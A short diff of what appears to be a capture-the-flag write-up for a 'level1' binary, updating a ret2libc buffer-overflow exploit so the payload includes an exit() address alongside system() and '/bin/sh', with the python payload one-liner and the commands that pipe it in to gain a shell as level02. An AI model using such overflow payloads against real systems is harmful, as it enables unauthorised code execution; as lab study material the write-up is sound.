@@ -15,12 +15,12 @@ we can overflow in eip on password's fgets, offset is eip
 
 ret2libc attack
 
-also we can find address to system call and the one of "/bin/sh"
+also we can find address of system call, of exit call, and the one of "/bin/sh"
 
 chmod 777 .
 touch exploit
 chmod 777 exploit
-python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "BUFF" + "\xec\x97\xf8\xf7")' > exploit
+python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")' > exploit
 cat exploit - | ./level1
 
 we are inside shell as level02
